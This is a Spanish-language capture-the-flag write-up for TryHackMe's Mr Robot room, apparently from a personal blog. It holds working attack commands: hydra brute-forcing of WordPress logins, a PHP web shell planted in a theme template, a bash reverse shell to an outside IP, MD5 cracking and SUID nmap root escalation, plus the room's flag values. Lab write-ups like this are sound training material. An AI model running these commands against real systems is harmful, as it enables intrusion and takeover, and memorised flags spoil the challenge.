---
layout: single
title: Mr Robot CTF - TryHackMe
excerpt: " Mr. Robot CTF is a Mr. Robot-themed room on TryHackMe. It involves basic recon and it will give you a start on WordPress vulnerabilities if you are new to Web exploitation (WordPress Vulnerability → Reverse Shell). "
date: 2022-09-15
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-mrrobotctf/mrrobotctf.jpeg
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:  
  - wordpress
  - hydra
  - php
  - python
---

Mr. Robot CTF is **a Mr.** **Robot-themed room on TryHackMe**. It involves basic recon and it will give you a start on WordPress vulnerabilities if you are new to Web exploitation (WordPress Vulnerability → Reverse Shell).

# Summary
- IP: 10.10.134.125
- Ports: 80,443
- OS: Linux (Ubuntu)
- Services & Applications:
	-  80 -> Apache httpd
	-  443 -> Apache httpd

# Recon

- Escaneo de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.134.125 -oG allPorts
```

- Escaneo profundo de puertos encontrados:

```bash
$sudo nmap -p80,443 -sCV 10.10.134.125 -oN targeted
```

- Examinamos la página web con gobuster:

```bash
$gobuster dir -u http://10.10.134.125/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt
```


- Analizamos el archivo "robots.txt" y encontramos directorios, examinamos los mismos y encontramos la primera flag:
# 1ra FLAG: 073403c8a58a1f80d943455fb30724b9

- Analizamos el directorio "wp-login.php" y nos encontramos con una página de login de wordpress, interceptamos con burpsuite la petición al intentar logear y encontramos los parámetros log y pwd, los cuales usaremos con hydra para aplicar fuerza bruta; 
- Primero encontraremos un usuario, esto usando el diccionado encontrado antes en el archivo robots.txt
PoC:
```bash
hydra -L <user.file> -P <password.file> <IP Address> http-post-form “<Login Page>:<Request Body>:<Error Message>”

```


```bash
$hydra -L fsocity.dic -p test 10.10.134.125 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.134.125%2Fwp-admin%2F&testcookie=1:invalid username" -t 30
```

- Encontramos el usuario Elliot, ahora intentamos encontrar la contraseña:

```bash
$hydra -l Elliot -P file.txt 10.10.134.125 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.134.125%2Fwp-admin%2F&testcookie=1:The password you entered for the username" -t 30
```


O usando wpscan:

```bash
$wpscan --url http://10.10.134.125/wp-login.php -U Elliot -P /home/dante/Tryhackme/MrRobotCTF/content/fsocity.dic
```


- Accdemos al panel de Wordpress, buscamos el editor de temas, escogemos una plantilla, buscamos el recurso 404 template y lo editamos incrustándole una reverse shell en PHP:


```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

- Guardamos el recurso y accedemos a él poniéndonos en escucha en el puerto 443:

http://10.10.134.125/wp-content/themes/twentythirteen/404.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.18.101.123/443  0>%261"

- Hacemos tratamiento de la tty y buscamos la segunda flag.
- Como la tty no se encuentra ejecutada como bash lo hacemos con el siguiente comando:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

- No tenemos permisos paras abrir la flag, pero tenemos un archivo password md5 el cual tendremos que crackear con John:

```bash
$sudo john --format=Raw-MD5 -w:/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt password.txt
```


- Encontramos la segunda flag:
# 2da FLAG: 822c73956184f694993bede3eb39f959



# Escalando privilegios:

- Buscamos binarios con permisos SUID:

```bash
robot@linux:/usr/local/bin$ find / -perm -4000 2>/dev/null
```


- Notamos que podemos ejecutar nmap con permisos SUID, buscamos en GTFobins posibles maneras de acceder como root y vemos lo siguiente:

```bash
The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.


nmap --interactive
nmap> !sh
```


- Buscamos la root flag:
# ROOT FLAG 3ra: 04787ddef27c3dee1ee161b21670b4e4
